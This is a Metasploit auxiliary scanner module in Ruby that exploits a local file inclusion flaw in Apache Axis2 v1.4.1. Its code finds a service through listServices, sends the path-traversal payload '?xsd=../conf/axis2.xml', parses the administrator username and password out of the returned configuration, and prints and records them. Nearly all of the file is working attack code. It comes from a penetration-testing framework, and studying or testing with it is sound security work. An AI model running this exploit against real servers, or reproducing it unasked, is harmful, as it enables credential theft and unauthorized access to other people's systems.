##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner


  def initialize
    super(
      'Name'           => 'Apache Axis2 v1.4.1 Local File Inclusion',
      'Description'    => %q{
          This module exploits an Apache Axis2 v1.4.1 local file inclusion (LFI) vulnerability.
        By loading a local XML file which contains a cleartext username and password, attackers can trivially
        recover authentication credentials to Axis services.
      },
      'References'     =>
        [
          ['EDB', '12721'],
          ['OSVDB', '59001'],
        ],
      'Author'         =>
        [
          '==[ Alligator Security Team ]==',
          'Tiago Ferreira <tiago.ccna[at]gmail.com>'
        ],
      'License'        =>  MSF_LICENSE
    )

    register_options([
      Opt::RPORT(8080),
      OptString.new('URI', [false, 'The path to the Axis listServices', '/axis2/services/listServices']),
    ], self.class)
  end

  def target_url
    uri = normalize_uri(datastore['URI'])
    "http://#{vhost}:#{rport}#{uri}"
  end

  def run_host(ip)
    uri = normalize_uri(datastore['URI'])

    begin
      res = send_request_raw({
        'method'  => 'GET',
        'uri'     => uri,
      }, 25)

      if (res and res.code == 200)
        extract_uri = res.body.to_s.match(/\/axis2\/services\/([^\s]+)\?/)
        new_uri = "/axis2/services/#{$1}"
        new_uri = normalize_uri(new_uri)
        get_credentials(new_uri)

      else
        print_status("#{target_url} - Apache Axis - The remote page not accessible")
        return

      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE

    end
  end

  def get_credentials(uri)
    lfi_payload = "?xsd=../conf/axis2.xml"

    begin
      res = send_request_raw({
        'method'  => 'GET',
        'uri'     => "#{uri}" + lfi_payload,
      }, 25)

      print_status("#{target_url} - Apache Axis - Dumping administrative credentials")

      if res.nil?
        print_error("#{target_url} - Connection timed out")
        return
      end

      if (res.code == 200)
        if res.body.to_s.match(/axisconfig/)

          res.body.scan(/parameter\sname=\"userName\">([^\s]+)</)
          username = $1
          res.body.scan(/parameter\sname=\"password\">([^\s]+)</)
          password = $1

          print_good("#{target_url} - Apache Axis - Credentials Found Username: '#{username}' - Password: '#{password}'")

          report_auth_info(
            :host => rhost,
            :port => rport,
            :sname => (ssl ? 'https' : 'http'),
            :user => username,
            :pass => password,
            :proof => "WEBAPP=\"Apache Axis\", VHOST=#{vhost}",
            :active => true
          )

        else
          print_error("#{target_url} - Apache Axis - Not Vulnerable")
          return :abort
        end

      else
        print_error("#{target_url} - Apache Axis - Unrecognized #{res.code} response")
        return :abort

      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
